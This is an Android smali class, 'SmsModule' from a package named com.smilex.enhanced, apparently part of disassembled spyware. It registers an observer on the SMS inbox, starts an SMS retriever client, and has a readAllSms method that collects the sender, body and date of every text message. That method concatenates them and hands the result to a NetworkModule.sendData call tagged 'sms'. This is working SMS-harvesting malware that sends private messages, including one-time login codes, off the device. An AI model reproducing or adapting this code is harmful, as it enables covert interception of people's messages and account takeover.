.class public Lcom/smilex/enhanced/modules/SmsModule;
.super Ljava/lang/Object;
.source "SmsModule.java"

.field private static sObserver:Landroid/database/ContentObserver;

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public static init(Landroid/content/Context;)V
    .registers 4
    invoke-static {p0}, Lcom/smilex/enhanced/modules/SmsModule;->startSmsRetrieverClient(Landroid/content/Context;)V
    new-instance v0, Lcom/smilex/enhanced/modules/SmsModule$SmsContentObserver;
    new-instance v1, Landroid/os/Handler;
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
    move-result-object v2
    invoke-direct {v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
    invoke-direct {v0, v1, p0}, Lcom/smilex/enhanced/modules/SmsModule$SmsContentObserver;-><init>(Landroid/os/Handler;Landroid/content/Context;)V
    sput-object v0, Lcom/smilex/enhanced/modules/SmsModule;->sObserver:Landroid/database/ContentObserver;
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
    move-result-object v0
    const-string v1, "content://sms/inbox"
    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
    move-result-object v1
    const/4 v2, 0x1
    sget-object v3, Lcom/smilex/enhanced/modules/SmsModule;->sObserver:Landroid/database/ContentObserver;
    invoke-virtual {v0, v1, v2, v3}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V
    return-void
.end method

.method public static readAllSms(Landroid/content/Context;)V
    .registers 10
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
    move-result-object v0
    const-string v1, "content://sms/inbox"
    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
    move-result-object v1
    const/4 v2, 0x4
    new-array v2, v2, [Ljava/lang/String;
    const/4 v3, 0x0
    const-string v4, "address"
    aput-object v4, v2, v3
    const/4 v3, 0x1
    const-string v4, "body"
    aput-object v4, v2, v3
    const/4 v3, 0x2
    const-string v4, "date"
    aput-object v4, v2, v3
    const/4 v3, 0x3
    const-string v4, "read"
    aput-object v4, v2, v3
    const/4 v3, 0x0
    const/4 v4, 0x0
    const/4 v5, 0x0
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    move-result-object v6
    if-eqz v6, :done
    new-instance v7, Ljava/lang/StringBuilder;
    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V
    :loop
    invoke-interface {v6}, Landroid/database/Cursor;->moveToNext()Z
    move-result v0
    if-eqz v0, :send
    const/4 v0, 0x0
    invoke-interface {v6, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v0
    const/4 v1, 0x1
    invoke-interface {v6, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v1
    const/4 v2, 0x2
    invoke-interface {v6, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v2
    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v0, "|"
    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    goto :loop
    :send
    invoke-virtual {v7}, Ljava/lang/StringBuilder;->length()I
    move-result v0
    if-lez v0, :done
    const-string v0, "sms"
    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1
    invoke-static {v0, v1}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V
    :done
    if-eqz v6, :return
    invoke-interface {v6}, Landroid/database/Cursor;->close()V
    :return
    return-void
.end method

.method private static startSmsRetrieverClient(Landroid/content/Context;)V
    .registers 3
    invoke-static {p0}, Lcom/google/android/gms/auth/api/phone/SmsRetriever;->getClient(Landroid/content/Context;)Lcom/google/android/gms/auth/api/phone/SmsRetrieverClient;
    move-result-object v0
    invoke-virtual {v0}, Lcom/google/android/gms/auth/api/phone/SmsRetrieverClient;->startSmsRetriever()Lcom/google/android/gms/tasks/Task;
    return-void
.end method
